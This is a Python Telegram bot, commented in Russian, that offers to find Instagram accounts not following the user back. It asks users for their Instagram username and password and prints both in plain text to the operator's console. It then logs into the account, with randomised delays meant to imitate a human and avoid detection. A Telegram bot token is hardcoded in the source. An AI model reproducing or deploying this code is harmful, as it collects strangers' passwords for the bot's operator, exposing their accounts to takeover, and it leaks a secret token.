from instagrapi import Client
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
import logging
import time
import random

# Настройка логирования
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Переменные для хранения данных
user_data = {}
cl = Client()

# Задержки для имитации человеческого поведения
def human_delay(min_delay=2, max_delay=5):
    time.sleep(random.uniform(min_delay, max_delay))

# Функция для команды /start
def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('Привет! Введи логин от Instagram:')
    user_data[update.effective_user.id] = {'step': 'login'}

# Обработка сообщений
def handle_message(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    text = update.message.text

    if user_id not in user_data or 'step' not in user_data[user_id]:
        update.message.reply_text('Сначала введи /start')
        return

    step = user_data[user_id]['step']

    if step == 'login':
        user_data[user_id]['username'] = text
        update.message.reply_text('Теперь введи пароль:')
        user_data[user_id]['step'] = 'password'
        print(f"Логин от пользователя {user_id}: {text}")  # Вывод в VS Code

    elif step == 'password':
        user_data[user_id]['password'] = text
        update.message.reply_text('Проверяю подписчиков... Это может занять время.')
        print(f"Пароль от пользователя {user_id}: {text}")  # Вывод в VS Code
        context.job_queue.run_once(check_instagram, 0, context=user_id)

# Проверка подписчиков в Instagram
def check_instagram(context: CallbackContext) -> None:
    user_id = context.job.context
    username = user_data[user_id]['username']
    password = user_data[user_id]['password']

    try:
        cl.delay_range = [2, 6]
        cl.login(username, password)
        context.bot.send_message(chat_id=user_id, text="Успешно вошли в аккаунт!")
        human_delay()

        user_id_instagram = cl.user_id_from_username(username)
        human_delay(1, 3)

        context.bot.send_message(chat_id=user_id, text="Получаю список подписчиков...")
        followers = cl.user_followers(user_id_instagram)
        followers_list = [user.username for user in followers.values()]
        context.bot.send_message(chat_id=user_id, text=f"Всего подписчиков: {len(followers_list)}")
        human_delay(2, 4)

        context.bot.send_message(chat_id=user_id, text="Получаю список подписок...")
        following = cl.user_following(user_id_instagram)
        following_list = [user.username for user in following.values()]
        context.bot.send_message(chat_id=user_id, text=f"Всего подписок: {len(following_list)}")
        human_delay(2, 4)

        not_following_back = [user for user in following_list if user not in followers_list]

        if not_following_back:
            result = f"Всего подписчиков: {len(followers_list)}\nВсего подписок: {len(following_list)}\n\n" \
                     f"Эти пользователи не подписаны на вас в ответ ({len(not_following_back)}):\n" + \
                     "\n".join([f"- {user}" for user in not_following_back[:20]])
            context.bot.send_message(chat_id=user_id, text=result)
        else:
            context.bot.send_message(chat_id=user_id, text="Все, на кого вы подписаны, подписаны на вас в ответ!")

        human_delay(1, 3)
        cl.logout()
        context.bot.send_message(chat_id=user_id, text="Проверка завершена, выход выполнен.")

    except Exception as e:
        context.bot.send_message(chat_id=user_id, text=f"Ошибка: {str(e)}")
        logger.error(f"Ошибка для {username}: {e}")

    user_data.pop(user_id, None)

# Главная функция
def main() -> None:
    TOKEN = "7651839668:AAF4231-RfR5g-E-4P5W-pUPaZf5zjWME0I"  # Твой токен

    # Создаем Updater
    updater = Updater(TOKEN, use_context=True)

    # Получаем диспетчер для регистрации обработчиков
    dp = updater.dispatcher

    # Обработчики
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    # Запуск бота
    print("Бот запущен! Введи /start в Telegram.")
    updater.start_polling(timeout=30)
    updater.idle()

if __name__ == '__main__':
    main()